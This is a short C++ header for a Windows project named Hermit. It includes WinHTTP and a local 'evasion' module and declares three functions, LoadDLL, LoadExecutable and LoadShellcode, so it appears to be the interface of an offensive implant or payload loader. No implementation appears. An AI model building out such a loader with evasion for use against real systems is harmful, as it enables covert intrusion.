#ifndef HERMIT_HPP
#define HERMIT_HPP

#include <windows.h>
#include <winhttp.h>
#include "core/evasion.hpp"
#include "core/handler.hpp"
#include "core/system.hpp"
#include "core/utils.hpp"

namespace Hermit
{
    BOOL LoadDLL();
    BOOL LoadExecutable();
    BOOL LoadShellcode();
}

#endif // HERMIT_HPP